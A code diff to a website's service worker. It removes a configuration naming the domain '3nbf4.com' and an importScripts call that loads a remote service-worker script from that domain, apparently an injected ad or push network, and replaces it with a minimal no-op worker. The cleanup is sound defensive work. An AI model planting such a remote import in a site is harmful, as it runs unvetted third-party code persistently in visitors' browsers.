@@ -1,6 +1,14 @@
-self.options = {
-    "domain": "3nbf4.com",
-    "zoneId": 10572399
-}
-self.lary = ""
-importScripts('https://3nbf4.com/act/files/service-worker.min.js?r=sw')
+// Minimal safe service worker. Avoid importing third-party scripts directly.
+self.addEventListener('install', (event) => {
+    // Activate immediately
+    self.skipWaiting();
+});
+
+self.addEventListener('activate', (event) => {
+    self.clients.claim();
+});
+
+// No-op fetch handler to avoid interfering with app unless explicitly extended
+self.addEventListener('fetch', (event) => {
+    // Intentionally empty — extend if you need offline caching or background sync.
+});
